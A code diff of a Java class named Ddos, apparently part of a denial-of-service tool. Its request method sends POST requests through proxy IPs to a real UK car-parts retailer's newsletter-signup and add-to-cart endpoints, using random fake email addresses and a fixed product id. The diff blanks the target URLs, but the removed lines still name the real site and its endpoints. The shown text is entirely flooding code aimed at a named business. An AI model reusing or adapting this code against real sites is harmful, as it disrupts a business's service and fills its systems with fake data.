@@ -49,7 +49,7 @@ public class Ddos implements Runnable {
 
     private HttpModel request(Map<String, String > header, String proxyIp) {
         if(this.url.contains("post")) {
-            String url = "https://www.maxpeedingrods.co.uk/index.php?route=extension/module/gg_newsletter/postSubscribe";
+            String url = "";
             Map<String, String> params = new HashMap<>();
             String email = Utils.generateRandomStr(10) + "@"
                     + Utils.generateRandomStr(5) + "."
@@ -57,7 +57,7 @@ public class Ddos implements Runnable {
             params.put("tm_newsletter_email", email);
             return HttpRequest.sendPostRequest(url, params, proxyIp);
         }else if(this.url.contains("cart")){
-            String url = "https://www.maxpeedingrods.co.uk/index.php?route=checkout/cart/add";
+            String url = "";
             Map<String, String> params = new HashMap<>();
             params.put("product_id", "61041");
             return HttpRequest.sendPostRequest(url, params, proxyIp);
